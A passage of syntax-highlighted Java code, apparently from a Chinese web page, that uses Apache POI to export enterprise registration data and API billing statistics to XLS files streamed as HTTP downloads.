keyword">try</span> <span class="token punctuation">{</span>            List<span class="token operator">&lt;</span>String<span class="token operator">></span> title <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"银行主键(bankUid)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"企业ID(entUid)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"企业名称(entName)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"统一社会信用代码(entRegNo)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"法定代表人(legalPerson)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"登记机关(entRegUnit)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"成立日期(entRegDt)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"登记状态(entstatus)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"企业类型(entType)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"注册资本(entRegAmount)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"单位(regcapunit)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"币种(regcapcur)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"营业期限(起止)(entdeadline)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"核准日期(approvalDate)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"企业地址(entAddress)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"经营范围(entRange)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"历史名称(entHisName)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"所属行业(industryconame)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span>            HSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFCellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//设置背景颜色</span><span class="token comment" spellcheck="true">//            style.setFillForegroundColor(HSSFColor.LIME.index);</span>            style<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>GREEN<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setFillBackgroundColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>GREEN<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 生成一个字体</span>            HSSFFont font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            <span class="token comment" spellcheck="true">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作sheet,对应到一个excel文档的tab</span>            HSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"sheet1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的sheet的一行 (表头)</span>            HSSFRow row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 表头内容填充</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置excel每列宽度</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                HSSFCell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 创建内容行</span>            HSSFCellStyle cellStyle <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cellStyle<span class="token punctuation">.</span><span class="token function">setWrapText</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 自动换行</span><span class="token comment" spellcheck="true">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat("0.00"));</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                HSSFRow contentRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                ImportEntQz importEntQz <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                String bankUid <span class="token operator">=</span> importEntQz<span class="token punctuation">.</span><span class="token function">getBankUid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String entName <span class="token operator">=</span> importEntQz<span class="token punctuation">.</span><span class="token function">getEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String NSRSBH <span class="token operator">=</span> importEntQz<span class="token punctuation">.</span><span class="token function">getNSRSBH</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String SHXYDM <span class="token operator">=</span> importEntQz<span class="token punctuation">.</span><span class="token function">getSHXYDM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    HSSFCell cell <span class="token operator">=</span> contentRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>bankUid<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>entName<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"（"</span><span class="token punctuation">,</span> <span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"）"</span><span class="token punctuation">,</span> <span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"\\(车购税\\)"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>SHXYDM<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">default</span><span class="token operator">:</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">writeExcelIo</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*通用输出方法*/</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">writeExcelIo</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> HSSFWorkbook workbook<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ByteArrayOutputStream os <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            workbook<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> content <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InputStream is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置response参数，可以打开下载页面</span><span class="token comment" spellcheck="true">//            response.setHeader("Content-Disposition" ,"attachment;filename="+new String(("tre"+".xls").getBytes(),"ISO-8859-1"));</span><span class="token comment" spellcheck="true">//            response.setContentType("application/msexcel;charset=GBK");</span>        response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"application/msdownload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-disposition"</span><span class="token punctuation">,</span> <span class="token string">"attachment; filename="</span>                <span class="token operator">+</span> URLEncoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">"qz_report.xls"</span><span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//            response.setContentType("application/vnd.ms-excel;charset=utf-8");</span><span class="token comment" spellcheck="true">//            response.setHeader("Content-Disposition", "attachment;filename=" + new String(("qz_report" + ".xls").getBytes("gb2312"), "iso-8859-1"));</span>        ServletOutputStream out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BufferedInputStream bis <span class="token operator">=</span> null<span class="token punctuation">;</span>        BufferedOutputStream bos <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>            bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedOutputStream</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">2048</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> bytesRead<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Simple read/write loop.</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>bytesRead <span class="token operator">=</span> bis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> buff<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                bos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">final</span> IOException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> e<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bis <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                bis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bos <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                bos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exportBillingStatistics</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>BillingStatisticsMap<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            List<span class="token operator">&lt;</span>String<span class="token operator">></span> title <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"客户名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"接口名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"接口调用次数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"接口单价"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"接口总价"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"统计周期"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span>            HSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFCellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 生成一个字体</span>            HSSFFont font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            <span class="token comment" spellcheck="true">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作sheet,对应到一个excel文档的tab</span>            HSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"sheet1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的sheet的一行 (表头)</span>            HSSFRow row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 表头内容填充</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置excel每列宽度</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                HSSFCell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 创建内容行</span>            HSSFCellStyle cellStyle <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cellStyle<span class="token punctuation">.</span><span class="token function">setWrapText</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 自动换行</span><span class="token comment" spellcheck="true">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat("0.00"));</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                HSSFRow contentRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                BillingStatisticsMap billingStatisticsMap <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    HSSFCell cell <span class="token operator">=</span> contentRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>billingStatisticsMap<span class="token punctuation">.</span><span class="token function">getUserName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>billingStatisticsMap<span class="token punctuation">.</span><span class="token function">getDataitemUName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>billingStatisticsMap<span class="token punctuation">.</span><span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>billingStatisticsMap<span class="token punctuation">.</span><span class="token function">getActualPrice</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>billingStatisticsMap<span class="token punctuation">.</span><span class="token function">getAllPrice</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>billingStatisticsMap<span class="token punctuation">.</span><span class="token function">getRangeTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">default</span><span class="token operator">:</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">writeExcelIo</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exportBillingStatisticsDetail</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>BillingStatisticsDetailMap<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            List<span class="token operator">&lt;</span>String<span class="token operator">></span> title <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"用户名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"接口名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"企业名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"调用日期"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"有无内容"</span><span class="token 